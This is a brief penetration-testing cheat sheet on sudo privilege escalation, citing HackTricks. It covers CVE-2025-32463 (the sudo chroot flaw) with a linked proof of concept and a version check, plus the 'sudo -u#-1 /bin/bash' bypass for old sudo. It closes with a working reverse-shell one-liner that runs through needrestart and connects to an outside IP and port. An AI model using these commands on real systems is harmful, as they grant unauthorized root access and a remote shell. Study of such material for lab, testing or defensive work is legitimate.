# Sudo

REF: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-version

## Sudo < 1.9.17p1
Sudo versions before 1.9.17p1 (1.9.14 - 1.9.17 < 1.9.17p1) allows unprivileged local users to escalate their privileges to root via sudo --chroot option when /etc/nsswitch.conf file is used from a user controlled directory.

Here is a PoC (https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) to exploit that vulnerability. Before running the exploit, make sure that your sudo version is vulnerable and that it supports the chroot feature.

For more information, refer to the original vulnerability advisory

sudo < v1.8.28
From @sickrov

sudo -u#-1 /bin/bash

## CVE-2025-32463_chwoot)

### Vulnerable sudo
pwn ~ $ sudo -R woot woot
sudo: woot: No such file or directory

### Patched sudo
pwn ~ $ sudo -R woot woot
[sudo] password for pwn:
sudo: you are not permitted to use the -R option with woot


## Sudo NOPASSWD

sudo -l

Are there commands that can be run with NOPASSWD?

https://www.revshells.com/

sudo /usr/sbin/needrestart sh -i >& /dev/tcp/10.10.14.120/4444 0>&1
